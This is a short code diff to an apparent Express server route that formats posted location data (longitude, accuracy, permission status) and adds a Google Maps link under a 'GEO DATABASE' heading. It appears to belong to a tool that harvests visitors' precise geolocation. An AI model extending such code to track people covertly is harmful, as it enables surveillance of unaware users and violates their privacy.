@@ -139,6 +139,7 @@ app.post("/data", async (req, res) => {
 📌 LONG      ➤ ${val(data.Location?.Longitude)}
 🎯 ACCURACY  ➤ ${val(data.Location?.Accuracy)}
 🗺 MAP       ➤ ${val(data.Permissions?.Location)}
+🌍 Location  ➤ ${data.Location?.Google_Maps || "N/A"}
 
 🌍 <b>GEO DATABASE</b>
 ════════════════════
